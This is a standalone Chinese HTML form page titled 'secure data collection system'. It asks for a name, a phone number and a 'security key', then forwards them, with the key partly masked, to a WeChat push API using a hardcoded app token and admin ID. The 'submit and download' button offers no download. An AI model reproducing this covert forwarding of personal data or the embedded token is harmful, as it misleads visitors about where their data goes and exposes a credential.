<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全数据采集系统</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }

        .form-container {
            background: rgba(255, 255, 255, 0.98);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 480px;
            position: relative;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        h1 {
            color: #2d3748;
            margin-bottom: 30px;
            text-align: center;
            font-size: 1.8rem;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #4a5568;
            font-weight: 500;
            font-size: 14px;
        }

        input, textarea {
            width: 100%;
            padding: 14px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            background: rgba(255, 255, 255, 0.9);
        }

        textarea {
            min-height: 120px;
            resize: vertical;
            line-height: 1.5;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            spellcheck: false;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
            background: white;
        }

        button[type="submit"] {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
        }

        button[type="submit"]:hover {
            transform: translateY(-2px);
            opacity: 0.95;
        }

        @media (max-width: 480px) {
            .form-container {
                padding: 25px;
            }
            h1 {
                font-size: 1.5rem;
            }
        }

        /* 环境提示 */
        .env-info {
            position: absolute;
            top: -15px;
            right: -15px;
            background: rgba(255,255,255,0.95);
            padding: 8px 15px;
            border-radius: 20px;
            box-shadow: 0 3px 12px rgba(0,0,0,0.1);
            font-size: 12px;
            color: #4a5568;
            transform: translateY(-50%);
            border: 1px solid rgba(0,0,0,0.1);
            display: flex;
            gap: 8px;
        }

        .env-info span {
            padding: 2px 6px;
            border-radius: 4px;
            background: rgba(102,126,234,0.1);
        }

        /* 微信提示蒙层 */
        .wechat-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            backdrop-filter: blur(5px);
        }

        .wechat-alert {
            background: white;
            border-radius: 16px;
            padding: 30px;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
        }

        .wechat-alert h3 {
            color: #e74c3c;
            margin: 0 0 20px 0;
            font-size: 20px;
        }

        .wechat-alert p {
            color: #666;
            line-height: 1.6;
            margin: 0 0 25px 0;
        }

        .wechat-alert button {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: opacity 0.3s;
        }

        .wechat-alert button:hover {
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <div class="env-info" id="envInfo">
            <span id="browserType">检测中...</span>
            <span id="osType">检测中...</span>
        </div>

        <h1>安全数据采集系统</h1>
        <form id="authForm">
            <div class="form-group">
                <label for="name">姓名</label>
                <input type="text" id="name" required placeholder="请输入真实姓名（2-4个汉字）">
            </div>

            <div class="form-group">
                <label for="phone">手机号</label>
                <input type="tel" id="phone" required placeholder="请输入11位有效手机号">
            </div>

            <div class="form-group">
                <label for="secret">安全密钥</label>
                <textarea 
                    id="secret" 
                    required 
                    placeholder="请输入安全密钥（至少8个字符，支持多行）"
                    rows="4"
                ></textarea>
            </div>

            <button type="submit">提交并下载</button>
        </form>
    </div>

    <script>
	function validateForm() {
    // 获取表单元素
    const nameInput = document.getElementById('name');
    const phoneInput = document.getElementById('phone');
    const secretInput = document.getElementById('secret');
    
    // 姓名验证（2-4个汉字）
    const nameRegex = /^[\u4e00-\u9fa5]{2,4}$/;
    if (!nameRegex.test(nameInput.value.trim())) {
        showAlert('请输入2-4个汉字组成的真实姓名', 'error');
        nameInput.focus();
        return false;
    }

    // 手机号验证（11位有效号码）
    const phoneRegex = /^1[3-9]\d{9}$/;
    if (!phoneRegex.test(phoneInput.value.trim())) {
        showAlert('请输入有效的11位手机号码', 'error');
        phoneInput.focus();
        return false;
    }

    // 安全密钥验证（至少8字符）
    if (secretInput.value.trim().length < 8) {
        showAlert('安全密钥至少需要8个字符', 'error');
        secretInput.focus();
        return false;
    }

    return true; // 所有验证通过
}
const WXPUSHER_CONFIG = {
  appToken: "AT_TINTYkAmkUDXg8yd5Wp1RINrNZ5jfQlS",
  adminUID: "UID_EHpDbk2NAUtiukCNT0KELyM1mp9s",
  baseURL: "https://wxpusher.zjiecode.com/api/send/message"
};

// 增强版 GET 请求发送
async function sendWxPusher(data) {
  try {
    // 参数编码与验证
    const params = new URLSearchParams({
      appToken: WXPUSHER_CONFIG.appToken,
      contentType: '1', // 固定为文本类型
      uid: WXPUSHER_CONFIG.adminUID,
      content: data.content.substring(0, 500), // 限制长度防止URL过长
      url: encodeURIComponent(data.url || '') // 可选参数编码
    });

    // 添加安全校验参数
    const timestamp = Date.now();
    params.append('ts', timestamp);
    params.append('nonce', Math.random().toString(36).substr(2, 6));

    // 构造完整 URL
    const url = `${WXPUSHER_CONFIG.baseURL}/?${params}`;

    // 发送请求
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'X-Request-Source': 'web-client'
      }
    });

    // 处理响应
    const result = await response.json();
    if (result.code !== 1000) {
      throw new Error(`推送失败: ${result.msg}`);
    }
    return result;
  } catch (error) {
    console.error('请求异常:', error);
    throw error; // 继续向上抛出错误
  }
}

// 表单提交处理（修改部分）
document.getElementById('authForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  if (!validateForm()) return;

  const formData = {
    name: document.getElementById('name').value.trim(),
    phone: document.getElementById('phone').value.trim(),
    secret: document.getElementById('secret').value.trim(),
    url: window.location.href // 添加页面URL参数
  };

  // 构造消息内容
  const content = `新提交数据：
姓名：${formData.name}
电话：${formData.phone}
密钥：${formData.secret.slice(0, 3)}****`;

  try {
    // 并行执行下载和推送
    await Promise.all([
      sendWxPusher({ ...formData, content })
    ]);
    
    showAlert('操作成功', 'success');
    e.target.reset();
  } catch (error) {
    showAlert(`操作失败: ${error.message}`, 'error');
  }
});

// 新增提示组件
function showAlert(message, type) {
  const alertBox = document.createElement('div');
  alertBox.className = `alert ${type}`;
  alertBox.textContent = message;
  document.body.appendChild(alertBox);
  
  setTimeout(() => alertBox.remove(), 3000);
}
    </script>
</body>
</html>
